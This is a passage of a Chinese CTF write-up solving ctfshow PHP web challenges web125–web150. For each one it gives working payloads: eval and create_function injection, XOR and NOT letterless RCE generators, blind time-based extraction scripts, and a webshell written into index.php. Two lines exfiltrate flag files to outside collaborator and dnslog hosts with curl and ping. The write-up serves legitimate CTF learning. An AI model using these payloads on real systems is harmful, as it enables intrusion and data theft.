if(isset($_POST['CTF_SHOW'])&&isset($_POST['CTF_SHOW.COM'])&&!isset($_GET['fl0g'])){
    if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\{|\}|\"|\'|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print/i", $c)&&$c<=16){
         eval("$c".";");
         if($fl0g==="flag_give_me"){
             echo $flag;
         }
    }
}
?>
```

在上一题基础上过滤了flag和echo关键字，我们可以用highlight_file来显示文件，因为flag被在post中被ban了，我们通过get来传参，所以payload为

```php
CODE
?dotast=flag.php

post:
CTF_SHOW=1&CTF[SHOW.COM=1&fun=highlight_file($_GET[dotast])
```

## web126（parse_str()变量覆盖或$_SERVR['QUERY_STRING']）

```php
<?php

error_reporting(0);
highlight_file(__FILE__);
include("flag.php");
$a=$_SERVER['argv'];
$c=$_POST['fun'];
if(isset($_POST['CTF_SHOW'])&&isset($_POST['CTF_SHOW.COM'])&&!isset($_GET['fl0g'])){
    if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\{|\}|\"|\'|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d/i", $c) && strlen($c)<=16){
         eval("$c".";");  
         if($fl0g==="flag_give_me"){
             echo $flag;
         }
    }
}

```

### parse_str()

payload：

```php
POST：CTF_SHOW=1&CTF[SHOW.COM=1&fun=parse_str($a[1])
GET：/?a=1+fl0g=flag_give_me
parse_str是把查询字符串覆盖到变量中，这个题是将执行结果传回数组，+号分割，即a[0]=1，a[1]=fl0g=flag_give_me
```

### $_SERVR['QUERY_STRING']

这次正则匹配了一些关键字母，导致不能继续用上题payload；观察到这里是有`$_SERVER['argv']`

> `$_SERVER['argv'][0] = $_SERVER['QUERY_STRING']`
> query string是Uniform Resource Locator (URL)的一部分, 其中包含着需要传给web application的数据

这里进行了本地测试，注意需要在php.ini开启register_argc_argv配置项，测试代码为

```
PHP
<?php
$a=$_SERVER['argv'];
var_dump($a);
```

![image-20231112134514096](assets/image-20231112134514096.png)

所以如果我们get传入变量赋值语句，接着在post里面**来执行这个赋值语句**就可以完美绕过，payload为

```php
?$fl0g=flag_give_me;

post：
CTF_SHOW=1&CTF[SHOW.COM=1&fun=eval($a[0])//assert($a[0])
```

## web127（变量特性）

```php
<?php

error_reporting(0);
include("flag.php");
highlight_file(__FILE__);
$ctf_show = md5($flag);
$url = $_SERVER['QUERY_STRING'];


//特殊字符检测
function waf($url){
    if(preg_match('/\`|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\{|\;|\:|\[|\]|\}|\'|\"|\<|\,|\>|\.|\\\|\//', $url)){
        return true;
    }else{
        return false;
    }
}

if(waf($url)){
    die("嗯哼？");
}else{
    extract($_GET);
}


if($ctf_show==='ilove36d'){
    echo $flag;
}
```

这里开启了`$_SERVER['QUERY_STRING']`，上题已经解释过，这里用了一个extract()函数

> **extract()** 函数从数组中将变量导入到当前的符号表，使用数组键名作为变量名，使用数组键值作为变量值

举例就是`?a=2`，就会变成`$a=2`，这里`ctf_show`有个`_`需要构造，前面说过php中变量名只有数字字母下划线，被get或者post传入的变量名，如果含有`空格、+、[`则会被转化为`_`，这里空格没有被ban，所以我们就使用空格，payload为

```php
?ctf show=ilove36d
```

## web128（gettext()拓展）

```php
<?php

error_reporting(0);
include("flag.php");
highlight_file(__FILE__);

$f1 = $_GET['f1'];
$f2 = $_GET['f2'];

if(check($f1)){
    var_dump(call_user_func(call_user_func($f1,$f2)));
}else{
    echo "嗯哼？";
}
function check($str){
    return !preg_match('/[0-9]|[a-z]/i', $str);
} NULL
```

这里嵌套了两层的call_user_func，关于call_user_func函数在前面的题中已经讲过，不过我们可以再回顾一下，同时介绍新的知识点

> **call_user_func()** 函数把第一个参数作为回调函数，其余参数都是回调函数的参数

这里对`$f1`进行了正则过滤，不能为数字和字母，这里可以使用gettext拓展，开启此拓展`_() 等效于 gettext()`

```php
<?php
echo gettext("ctfshownb");
//输出结果：ctfshownb

echo _("ctfshownb");
//输出结果：ctfshownb
```

因此`call_user_func('_','ctfshownb')` 返回的结果为ctfshownb，接下来到第二层`call_user_func`，找了一圈发现`get_defined_vars`函数可以使用

> **get_defined_vars ( void ) : array** 函数返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量。

所以payload也就出来了

```php
CODE
?f1=_&f2=get_defined_vars
```

整个执行流程就是

```php
CODE
var_dump(call_user_func(call_user_func($f1,$f2)));
var_dump(call_user_func(call_user_func(_,'get_defined_vars')));
var_dump(call_user_func(get_defined_vars));//输出数组
```

## web129（目录穿越）

```php
<?php

error_reporting(0);
highlight_file(__FILE__);
if(isset($_GET['f'])){
    $f = $_GET['f'];
    if(stripos($f, 'ctfshow')>0){
        echo readfile($f);
    }
}
```

倒是变得简单了，传入get参数f，并且字符串中包含ctfshow就会读取文件，所以有多种利用姿势，这里讲几种
**第一种**
直接文件包含

```php
CODE
?f=/ctfshow/../../../../../../../../../var/www/html/flag.php
```

然后右键源码查看flag
**第二种**
远程文件包含，在自己的服务器上写一句话木马进行利用，url为你的服务器ip或者域名，xxxx.txt为你写的一句话木马

```php
CODE
?f=http://url/xxxx.txt?ctfshow
```

**第三种**
使用php伪协议读取

```php
CODE
?f=php://filter/read=convert.base64-encode|ctfshow/resource=flag.php
```

## web130（preg_match()正则绕过）

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
include("flag.php");
if(isset($_POST['f'])){
    $f = $_POST['f'];
    if(preg_match('/.+?ctfshow/is', $f)){
        die('bye!');
    }
    if(stripos($f, 'ctfshow') === FALSE){
        die('bye!!');
    }
    echo $flag;
}

```

- 非预期1：POST：f=ctfshow

第9行由于匹配模式是.+?，意味着如果符合判断条件，那么ctfshow前面必须有一个字符，也就是说f=ctfshow是不满足判断条件的，所以可以绕过匹配。如果匹配模式是.*?，即出现零次或多次，那么非预期就行不通了

- 非预期2：POST：f[]=anything

数组绕过

- 预期解：

> PHP 为了防止正则表达式的拒绝服务攻击（reDOS），给 pcre 设定了一个回溯次数上限 pcre.backtrack_limit，回溯次数上限默认是 100 万。如果回溯次数超过了 100 万，preg_match 将不再返回非 1 和 0，而是 false，就自动绕过了正则表达式。

poc：

```php
import requests
url = 'http://69fda5c2-d7bd-4eee-a840-25dc17ff48fd.challenge.ctf.show/'
data = {
    'f' : 'a' * 1000000 + 'ctfshow' 
}

r = requests.post(url=url, data=data)
print(r.text)
```

## web131（preg_match()正则绕过）

```php
<?php

error_reporting(0);
highlight_file(__FILE__);
include("flag.php");
if(isset($_POST['f'])){
    $f = (String)$_POST['f'];

    if(preg_match('/.+?ctfshow/is', $f)){
        die('bye!');
    }
    if(stripos($f,'36Dctfshow') === FALSE){
        die('bye!!');
    }

    echo $flag;

}

```

取消了web130的非预期，上一题思路仍然可解
poc：

```php
'''
Author: KonDream
Date: 2021-11-30 12:58:00
LastEditors:  KonDream
LastEditTime: 2021-11-30 12:58:01
Description:  
'''
import requests

url = 'http://4fef2867-91b1-4f3c-aec0-3f96683cceb1.challenge.ctf.show/'

data = {
    'f' : 'a' * 1000000 + '36Dctfshow' 
}

r = requests.post(url=url, data=data)
print(r.text)
```

## web132（运算符优先级）

打开发现是个网页，看一眼robots文件，发现存在admin目录，于是访问/admin

```php
<?php

#error_reporting(0);
include("flag.php");
highlight_file(__FILE__);


if(isset($_GET['username']) && isset($_GET['password']) && isset($_GET['code'])){
    $username = (String)$_GET['username'];
    $password = (String)$_GET['password'];
    $code = (String)$_GET['code'];

    if($code === mt_rand(1,0x36D) && $password === $flag || $username ==="admin"){
        
        if($code == 'admin'){
            echo $flag;
        }
        
    }
}
```

**对于“与”（&&） 运算： x && y 当x为false时，直接跳过，不执行y；** 

**对于“或”（||） 运算 ： x||y 当x为true时，直接跳过，不执行y。** 

所以：

```php
payload: ?username=admin&code=admin&password=dotast
#在判断这个的时候
if($code === mt_rand(1,0x36D) && $password === $flag || $username ==="admin")
第一个$code === mt_rand(1,0x36D)为false,之后就执行|| $username ==="admin"#成功绕过
```

## web133（变量覆盖）

```php
<?php

error_reporting(0);
highlight_file(__FILE__);
//flag.php
if($F = @$_GET['F']){
    if(!preg_match('/system|nc|wget|exec|passthru|netcat/i', $F)){
        eval(substr($F,0,6));
    }else{
        die("6个字母都还不够呀?!");
    }
}
```

这里限制了一些命令执行语句并且还限制了6个数字，我们可以采取套娃的方式来获得更多控制语句的空间

```php
get传参：F=`$F `;sleep 6

经过substr($F,0,6)截取后 得到 `$F `; 一共6个字符,之前说过``反引号等于shell_exec执行命令
eval("`$F `;sleep 6"); 
而$F就是我们输入的`$F `;sleep 6 最后执行的代码应该是``$F`;+sleep 6`
这样就成功执行了 sleep 6，可以看到发包后延长了6秒左右
前面的命令是执行我们的$F，后面的命令我们就可以自定义$F语句
```

这里首先打开burpsuite里的Collaborator Client
![image-20231112142130404](assets/image-20231112142130404.png)

![image-20231112142152882](assets/image-20231112142152882.png)

payload为

```
?F=`$F `;curl -X POST -F aaa=@flag.php caqr7n3bw0vz91bgvd9qbkqkibo2ct0i.oastify.com
```

## web134（变量覆盖）

```php
<?php

highlight_file(__FILE__);
$key1 = 0;
$key2 = 0;
if(isset($_GET['key1']) || isset($_GET['key2']) || isset($_POST['key1']) || isset($_POST['key2'])) {
    die("nonononono");
}
@parse_str($_SERVER['QUERY_STRING']);
extract($_POST);
if($key1 == '36d' && $key2 == '36d') {
    die(file_get_contents('flag.php'));
}
```

看到`parse_str()`函数和`extract()`函数，可以看得出是变量覆盖，这两个函数前面的题都讲过了，我们再简单讲一下流程

```php
parse_str($_SERVER['QUERY_STRING']);
var_dump($_POST);
```

如果我们传入?_POST[a]=dotast，就会输出`array(1) { ["a"]=> string(6) "dotast" }`，再使用extract函数，就会变成`$a=dotast`
所以payload为

```php
?_POST[key1]=36d&_POST[key2]=36d
```

## web135（变量覆盖）

```php
<?php

error_reporting(0);
highlight_file(__FILE__);
//flag.php
if($F = @$_GET['F']){
    if(!preg_match('/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i', $F)){
        eval(substr($F,0,6));
    }else{
        die("师傅们居然破解了前面的，那就来一个加强版吧");
    }
}
```

**非预期：**

133的升级版，这题也非预期了，原因是没禁用写权限
payload：/?F=`$F`; cp flag.php 1.txt
直接将flag写到了1.txt中，然后访问1.txt即可
预期解：通过Ping命令带出数据
/?F=`$F`;+ping `cat flag.php|awk 'NR==2'`.6x1sys.dnslog.cn
因为最终flag是两部分，所以通过awk NR一排一排的获得数据，但是这个方法我没有成功带出，还请成功的师傅指点一二

## web136（tee）

```php
<?php
error_reporting(0);
function check($x){
    if(preg_match('/\\$|\.|\!|\@|\#|\%|\^|\&|\*|\?|\{|\}|\>|\<|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i', $x)){
        die('too young too simple sometimes naive!');
    }
}
if(isset($_GET['c'])){
    $c=$_GET['c'];
    check($c);
    exec($c);
}
else{
    highlight_file(__FILE__);
}
?>
```

这里ban了大量函数和字符，不过在linux下还有一个命令tee

> Linux tee命令用于读取标准输入的数据，并将其内容输出成文件
> 用法:
> tee file1 file2 //复制文件
> ls|tee 1.txt //命令输出到1.txt文件中

首先查看一下根目录文件

```
?c=ls /|tee 1
?c=cat /f149_15_h3r3|tee 2
```

接着访问dotast进行下载
![img](https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/php%E7%89%B9%E6%80%A7/web136/%2892T~FC5~751I%7B%29T%25R%28HKJ6.png)
得到flag

## web137（call_user_func()）

```php
<?php

error_reporting(0);
highlight_file(__FILE__);
class ctfshow
{
    function __wakeup(){
        die("private class");
    }
    static function getFlag(){
        echo file_get_contents("flag.php");
    }
}

call_user_func($_POST['ctfshow']);
```

没有过滤，调用getFlag即可
payload：

```php
ctfshow[0]=ctfshow&ctfshow[1]=getFlag或者
ctfshow=ctfshow::getFlag或
```

第一个payload相当于执行call_user_func(ctfshow,getflag)

## web138（call_user_func）

```php
<?php

error_reporting(0);
highlight_file(__FILE__);
class ctfshow
{
    function __wakeup(){
        die("private class");
    }
    static function getFlag(){
        echo file_get_contents("flag.php");
    }
}

if(strripos($_POST['ctfshow'], ":")>-1){
    die("private function");
}

call_user_func($_POST['ctfshow']);
```

过滤了冒号
payload：ctfshow[0]=ctfshow&ctfshow[1]=getFlag

## web139（call_user_func）

```php
<?php
error_reporting(0);
function check($x){
    if(preg_match('/\\$|\.|\!|\@|\#|\%|\^|\&|\*|\?|\{|\}|\>|\<|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i', $x)){
        die('too young too simple sometimes naive!');
    }
}
if(isset($_GET['c'])){
    $c=$_GET['c'];
    check($c);
    exec($c);
}
else{
    highlight_file(__FILE__);
}
?>
```

咋看好似和之前的题没变化，但好像ban了写入文件的权限，没有回显了，只能开始盲注了，这里去了解了一下shell编程😿
利用shell编程的if判断语句配合awk以及cut命令来获取flag
awk逐行获取数据

![image-20231112145900583](assets/image-20231112145900583.png)

cut命令逐列获取单个字符
[![img](../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/web/CTFSHOW/ctfshow_web%2525E5%25258F%252582%2525E8%252580%252583/assets/LES%25252524GLDZX%25257D09Y03%25257DAVE92_U.png)](https://blog-file-1302856486.file.myqcloud.com/Web1000(一)/php特性/web139/LES%24GLDZX}09Y03}AVE92_U.png)
利用if语句来判断命令是否执行
![img](assets/%2524FR_P%5D%5BX%5BYIWN%5DSNEO7GGD7.png)
用命令`ls \`查看根目录来获取flag文件名，脚本如下

```python
PYTHON
#-- coding:UTF-8 --
# Author:dota_st
# Date:2021/2/28 1:25
# blog: www.wlhhlc.top
import requests
url = "http://1bb8ea48-6413-47ef-94bb-8dd313c14c9e.chall.ctf.show:8080/"
result = ""
for i in range(1,5):
    for j in range(1,15):
        #ascii码表
        for k in range(32,128):
            k=chr(k)
            payload = "?c=" + f"if [ `ls / | awk NR=={i} | cut -c {j}` == {k} ];then sleep 2;fi"
            try:
                requests.get(url=url+payload, timeout=(1.5,1.5))
            except:
                result = result + k
                print(result)
                break
    result += " "
```

![image-20231112145941466](assets/image-20231112145941466.png)
发现一个文件名是f149_15_h3r3的文件，flag就在这里边，那就改一下脚本cat一下

```php
PYTHON
#-- coding:UTF-8 --
# Author:dota_st
# Date:2021/2/28 1:25
# blog: www.wlhhlc.top
import requests
url = "http://1bb8ea48-6413-47ef-94bb-8dd313c14c9e.chall.ctf.show:8080/"
result = ""
for j in range(1,60):
    #ascii码表
    for k in range(32,128):
        k=chr(k)
        payload = "?c=" + f"if [ `cat /f149_15_h3r3 | cut -c {j}` == {k} ];then sleep 2;fi"
        try:
            requests.get(url=url+payload, timeout=(1.5,1.5))
        except:
            result = result + k
            print(result)
            break
result += " "
```

得到flag
![img](assets/AK861(EZ0%60FOYCLYCXS)XYE.png)
需要加上`{}`

## web140（弱比较）

```php
<?php

error_reporting(0);
highlight_file(__FILE__);
if(isset($_POST['f1']) && isset($_POST['f2'])){
    $f1 = (String)$_POST['f1'];
    $f2 = (String)$_POST['f2'];
    if(preg_match('/^[a-z0-9]+$/', $f1)){
        if(preg_match('/^[a-z0-9]+$/', $f2)){
            $code = eval("return $f1($f2());");
            if(intval($code) == 'ctfshow'){
                echo file_get_contents("flag.php");
            }
        }
    }
}


```

![image-20231112150640625](assets/image-20231112150640625.png)

**解答**：根据代码可知，f1和f2必须是字母和数字。if判断是弱等于，需要`intval($code)`的值为0。

> intval() 成功时，返回参数的 integer 值，失败时返回 0。空的 array 返回 0，非空的 array 返回 1。 字符串有可能返回 0，取决于字符串最左侧的字符。 intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1。

所以需要`$f1($f2());`的返回值，或者是字母开头的字符串，或者是空数组，或者就是0，或者FLASE。

**payload1**： system(system())---> `f1=system&f2=system`

`string system( string $command[, int &$return_var] )`：成功则返回命令输出的最后一行，失败则返回 FALSE 。system()必须包含参数，失败返回FLASE；system('FLASE')，空指令，失败返回FLASE。

**payload2**： usleep(usleep())---> `f1=usleep&f2=usleep` usleep没有返回值。 所以intval参数为空，失败返回0

**payload3**： getdate(getdate())---> `f1=getdate&f2=getdate`

`array getdate([ int $timestamp = time()] )`：返回结果是array，参数必须是int型。所以getdate(getdate())---->getdate(array型)--->失败返回flase，intval为0。

```
f1=usleep&f2=usleep
f1=md5&f2=md5
```



## web141（无字母RCE，异或）

```php
<?php

#error_reporting(0);
highlight_file(__FILE__);
if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){
    $v1 = (String)$_GET['v1'];
    $v2 = (String)$_GET['v2'];
    $v3 = (String)$_GET['v3'];

    if(is_numeric($v1) && is_numeric($v2)){
        if(preg_match('/^\W+$/', $v3)){
            $code =  eval("return $v1$v3$v2;");
            echo "$v1$v3$v2 = ".$code;
        }
    }
}

```

分析源代码，这里用了正则表达式`/^\W+$/`，把数字和字母还有下划线给ban了，之前无字母数字的webshell我们用了或运算，这次用异或来吧（或运算，异或，取反等等都可以），python脚本如下

```python
# -- coding:UTF-8 --
# Author:dota_st
# Date:2021/2/10 12:56
# blog: www.wlhhlc.top
import requests
import urllib
import re

# 生成可用的字符
def write_rce():
    result = ''
    preg = '[a-zA-Z0-9]'
    for i in range(256):
        for j in range(256):
            if not (re.match(preg, chr(i), re.I) or re.match(preg, chr(j), re.I)):
                k = i ^ j
                if k >= 32 and k <= 126:
                    a = '%' + hex(i)[2:].zfill(2)
                    b = '%' + hex(j)[2:].zfill(2)
                    result += (chr(k) + ' ' + a + ' ' + b + '\n')
    f = open('xor_rce.txt', 'w')
    f.write(result)


# 根据输入的命令在生成的txt中进行匹配
def action(arg):
    s1 = ""
    s2 = ""
    for i in arg:
        f = open("xor_rce.txt", "r")
        while True:
            t = f.readline()
            if t == "":
                break
            if t[0] == i:
                s1 += t[2:5]
                s2 += t[6:9]
                break
        f.close()
    output = "(\"" + s1 + "\"^\"" + s2 + "\")"
    return (output)


def main():
    write_rce()
    while True:
        s1 = input("\n[+] your function：")
        if s1 == "exit":
            break
        s2 = input("[+] your command：")
        param = action(s1) + action(s2)
        print("\n[*] result:\n" + param)

main()
```

![image-20231112151047339](assets/image-20231112151047339.png)

然后v1和v2就随意填，v3填构造出的payload即可，但注意的是这里有个return干扰，所以我们要在v3的payload前边和后面加上一些字符就可以执行命令，例如`\+ - *` 等等
查看当前目录下文件

```php
?v1=1&v2=1&v3=*("%08%02%08%08%05%0d"^"%7b%7b%7b%7c%60%60")("%0c%08"^"%60%7b");
```

获取flag

```php
?v1=1&v2=1&v3=*("%08%02%08%08%05%0d"^"%7b%7b%7b%7c%60%60")("%08%01%03%00%06%0c%01%07%00%0b%08%0b"^"%7c%60%60%20%60%60%60%60%2e%7b%60%7b");
```

## web142(easy)

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
if(isset($_GET['v1'])){
    $v1 = (String)$_GET['v1'];
    if(is_numeric($v1)){
        $d = (int)($v1 * 0x36d * 0x36d * 0x36d * 0x36d * 0x36d);
        sleep($d);
        echo file_get_contents("flag.php");
    }
} 
```

`is_numeric()`函数匹配为数字或者数字字符串的话会返回true，所以我们只需要输入数字就可以，但下面有个sleep休眠，所以需要传0，否则等到天荒地老…
payload为

```
?v1=0  或0x00
```

## web143(无字母数字RCE，以及return摆脱)



```
<?php
highlight_file(__FILE__);
if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){
    $v1 = (String)$_GET['v1'];
    $v2 = (String)$_GET['v2'];
    $v3 = (String)$_GET['v3'];
    if(is_numeric($v1) && is_numeric($v2)){
        if(preg_match('/[a-z]|[0-9]|\+|\-|\.|\_|\||\$|\{|\}|\~|\%|\&|\;/i', $v3)){
                die('get out hacker!');
        }
        else{
            $code =  eval("return $v1$v3$v2;");
            echo "$v1$v3$v2 = ".$code;
        }
    }
} 
```

在web141的基础上多ban掉一些字符，ban了取反，但没ban异或需要的`^`，所以还是可以用web141的脚本，不过需要改一下规则

在web141的基础上多ban掉一些字符，ban了取反，但没ban异或需要的`^`，所以还是可以用web141的脚本，不过需要改一下规则

```python
PYTHON
复制成功# -- coding:UTF-8 --
# Author:dota_st
# Date:2021/2/10 12:56
# blog: www.wlhhlc.top
import requests
import urllib
import re

# 生成可用的字符
def write_rce():
    result = ''
    preg = '[a-z]|[0-9]|\+|\-|\.|\_|\||\$|\{|\}|\~|\%|\&|\;'
    for i in range(256):
        for j in range(256):
            if not (re.match(preg, chr(i), re.I) or re.match(preg, chr(j), re.I)):
                k = i ^ j
                if k >= 32 and k <= 126:
                    a = '%' + hex(i)[2:].zfill(2)
                    b = '%' + hex(j)[2:].zfill(2)
                    result += (chr(k) + ' ' + a + ' ' + b + '\n')
    f = open('xor_rce.txt', 'w')
    f.write(result)


# 根据输入的命令在生成的txt中进行匹配
def action(arg):
    s1 = ""
    s2 = ""
    for i in arg:
        f = open("xor_rce.txt", "r")
        while True:
            t = f.readline()
            if t == "":
                break
            if t[0] == i:
                s1 += t[2:5]
                s2 += t[6:9]
                break
        f.close()
    output = "(\"" + s1 + "\"^\"" + s2 + "\")"
    return (output)


def main():
    write_rce()
    while True:
        s1 = input("\n[+] your function：")
        if s1 == "exit":
            break
        s2 = input("[+] your command：")
        param = action(s1) + action(s2)
        print("\n[*] result:\n" + param)

main()
```

![image-20231112151807983](assets/image-20231112151807983.png)
记住，v3这里需要前后加上符号拜托掉return，最终payload如下

```php
?v1=1&v2=1&v3=*("%0c%06%0c%0b%05%0d"^"%7f%7f%7f%7f%60%60")("%0c%0c"^"%60%7f")*
?v1=10&v2=0&v3=*("%0c%19%0c%5c%60%60"^"%7f%60%7f%28%05%0d") ("%0e%0c%00%00"^"%60%60%20%2a")?>
```

## web144(无字母数字RCE)

```php
<?php
highlight_file(__FILE__);
if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){
    $v1 = (String)$_GET['v1'];
    $v2 = (String)$_GET['v2'];
    $v3 = (String)$_GET['v3'];

    if(is_numeric($v1) && check($v3)){
        if(preg_match('/^\W+$/', $v2)){
            $code =  eval("return $v1$v3$v2;");
            echo "$v1$v3$v2 = ".$code;
        }
    }
}
function check($str){
    return strlen($str)===1?true:false;
} 
```

和web141一样，这是参数需要改一下，因为这里有个check函数对v3做检测，我们把payload改到v2即可，运行web141的脚本就行
payload如下

```php
?v1=1&v3=1&v2=*("%08%02%08%08%05%0d"^"%7b%7b%7b%7c%60%60")("%08%01%03%00%06%0c%01%07%00%0b%08%0b"^"%7c%60%60%20%60%60%60%60%2e%7b%60%7b");
```

## web145 (无字母数字RCE,摆脱return)

```php
<?php
highlight_file(__FILE__);
if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){
    $v1 = (String)$_GET['v1'];
    $v2 = (String)$_GET['v2'];
    $v3 = (String)$_GET['v3'];
    if(is_numeric($v1) && is_numeric($v2)){
        if(preg_match('/[a-z]|[0-9]|\@|\!|\+|\-|\.|\_|\$|\}|\%|\&|\;|\<|\>|\*|\/|\^|\#|\"/i', $v3)){
                die('get out hacker!');
        }
        else{
            $code =  eval("return $v1$v3$v2;");
            echo "$v1$v3$v2 = ".$code;
        }
    }
} 
```

在前面基础上ban了异或，但放行了`~`取反运算符，但之前v3需要`* ; + -` 等等符号来拜托return，但都被ban了，测试了一下发现`|`可以使用
取反脚本如下

```php
<?php
fwrite(STDOUT,'[+]your function: ');
$system=str_replace(array("\r\n", "\r", "\n"), "", fgets(STDIN));
fwrite(STDOUT,'[+]your command: ');
$command=str_replace(array("\r\n", "\r", "\n"), "", fgets(STDIN));
echo '[*] (~'.urlencode(~$system).')(~'.urlencode(~$command).');';
```

运行后构造payload如下

```
?v1=1&v2=1&v3=|(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%93%9E%98%D1%8F%97%8F)|
```



## web146(无字母数字RCE,摆脱return)

```php
<?php
highlight_file(__FILE__);
if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){
    $v1 = (String)$_GET['v1'];
    $v2 = (String)$_GET['v2'];
    $v3 = (String)$_GET['v3'];
    if(is_numeric($v1) && is_numeric($v2)){
        if(preg_match('/[a-z]|[0-9]|\@|\!|\:|\+|\-|\.|\_|\$|\}|\%|\&|\;|\<|\>|\*|\/|\^|\#|\"/i', $v3)){
                die('get out hacker!');
        }
        else{
            $code =  eval("return $v1$v3$v2;");
            echo "$v1$v3$v2 = ".$code;
        }
    }
} 
```

没看出和上一题有什么差别(可能多ban了一些字符)，直接用上一题payload即可

```php
CODE
?v1=1&v2=1&v3=|(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%93%9E%98%D1%8F%97%8F)|
```



## web147(create_function()注入以及默认命名空间'\\'绕过正则)

```php
<?php
highlight_file(__FILE__);

if(isset($_POST['ctf'])){
    $ctfshow = $_POST['ctf'];
    if(!preg_match('/^[a-z0-9_]*$/isD',$ctfshow)) {
        $ctfshow('',$_GET['show']);
    }
} 
```

换了题型，这里对ctf进行了一个正则表达式过滤，post传参的`ctf`和get传参的`show`进行了组合，这里我们可以使用`create_function()`代码注入

> string create_function ( string args , string args , string code )
>
> string $args 变量部分
> string $code 方法代码部分

例如

```PHP
PHP
create_function('$dotast','echo $dotast."very cool"')
//等于
function f($dotast){
    echo $dotast."very cool";
} 

/*利用如下
如果我们第二个参数输入的是'echo 111;}phpinfo();//'
即可把前面的方法括号给闭合并且成功执行phpinfo命令，后面用//注释掉后边的语句
也就是下面这个结构
*/
function f($dotast){
    echo 111;
}
phpinfo();//}
```

而正则表达式我们可以用`\`进行绕过，正好`\`在php里代表默认命名空间

> php里默认命名空间是\，所有原生函数和类都在这个命名空间中。 普通调用一个函数，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径； 而如果是\function_name()这样的形式去调用函数，则是表示写了一个绝对路径。 如果你在其他namespace里调用系统类，必须使用绝对路径的写法

![image-20231112153056681](assets/image-20231112153056681.png)
最终payload为

```php
?show=echo 123;}system("tac flag.php");//

post:
ctf=\create_function
```



## web148（无字母数字RCE）

```php
<?php
include 'flag.php';
if(isset($_GET['code'])){
    $code=$_GET['code'];
    if(preg_match("/[A-Za-z0-9_\%\\|\~\'\,\.\:\@\&\*\+\- ]+/",$code)){
        die("error");
    }
    @eval($code);
}
else{
    highlight_file(__FILE__);
}
function get_ctfshow_fl0g(){
    echo file_get_contents("flag.php");
} 
```

没ban掉异或字符`^`，之前用前面的脚本跑就好了

```php
PYTHON
# -- coding:UTF-8 --
# Author:dota_st
# Date:2021/2/10 12:56
# blog: www.wlhhlc.top
import requests
import urllib
import re

# 生成可用的字符
def write_rce():
    result = ''
    preg = '[A-Za-z0-9_\%\\|\~\'\,\.\:\@\&\*\+\- ]+'
    for i in range(256):
        for j in range(256):
            if not (re.match(preg, chr(i), re.I) or re.match(preg, chr(j), re.I)):
                k = i ^ j
                if k >= 32 and k <= 126:
                    a = '%' + hex(i)[2:].zfill(2)
                    b = '%' + hex(j)[2:].zfill(2)
                    result += (chr(k) + ' ' + a + ' ' + b + '\n')
    f = open('xor_rce.txt', 'w')
    f.write(result)


# 根据输入的命令在生成的txt中进行匹配
def action(arg):
    s1 = ""
    s2 = ""
    for i in arg:
        f = open("xor_rce.txt", "r")
        while True:
            t = f.readline()
            if t == "":
                break
            if t[0] == i:
                s1 += t[2:5]
                s2 += t[6:9]
                break
        f.close()
    output = "(\"" + s1 + "\"^\"" + s2 + "\")"
    return (output)


def main():
    write_rce()
    while True:
        s1 = input("\n[+] your function：")
        if s1 == "exit":
            break
        s2 = input("[+] your command：")
        param = action(s1) + action(s2)
        print("\n[*] result:\n" + param)

main()
运行后得到payload
```

```php
?code=("%08%02%08%09%05%0d"^"%7b%7b%7b%7d%60%60")("%09%01%03%01%06%0c%01%07%01%0b%08%0b"^"%7d%60%60%21%60%60%60%60%2f%7b%60%7b");

预期解：中文构造
?code=$哈="{{{"^"?<>/";${$哈}[哼](${$哈}[嗯]);&哼=system&嗯=tac f* "{{{"^"?<>/";  异或出来的结果是 _GET 
```

## web149（将计就计）

```php
<?php
error_reporting(0);
highlight_file(__FILE__);

$files = scandir('./'); 
foreach($files as $file) {
    if(is_file($file)){
        if ($file !== "index.php") {
            unlink($file);
        }
    }
}
file_put_contents($_GET['ctf'], $_POST['show']);

$files = scandir('./'); 
foreach($files as $file) {
    if(is_file($file)){
        if ($file !== "index.php") {
            unlink($file);
        }
    }
} 
```

这里用file_put_contents函数写入文件，并且会有两个for循环判断不是index.php的文件会被删除，所以我们直接把一句话木马写进index.php就可以，payload如下

```php
?ctf=index.php

post:
show=<?php @eval($_POST[dotast]);?>
```

接着再index.php里利用我们的马即可

```php
url+index.php

post:
dotast=system("cat /ctfshow_fl0g_here.txt");
```



## web150（php$_SERVER['QUERY_STRING']和extract()的错误使用，结合包含，导致变量覆盖实现日志文件包含）

```php
<?php
include("flag.php");
error_reporting(0);
highlight_file(__FILE__);

class CTFSHOW{
    private $username;
    private $password;
    private $vip;
    private $secret;

    function __construct(){
        $this->vip = 0;
        $this->secret = $flag;
    }

    function __destruct(){
        echo $this->secret;
    }

    public function isVIP(){
        return $this->vip?TRUE:FALSE;
        }
    }

    function __autoload($class){
        if(isset($class)){
            $class();
    }
}

#过滤字符
$key = $_SERVER['QUERY_STRING'];
if(preg_match('/\_| |\[|\]|\?/', $key)){
    die("error");
}
$ctf = $_POST['ctf'];
extract($_GET);
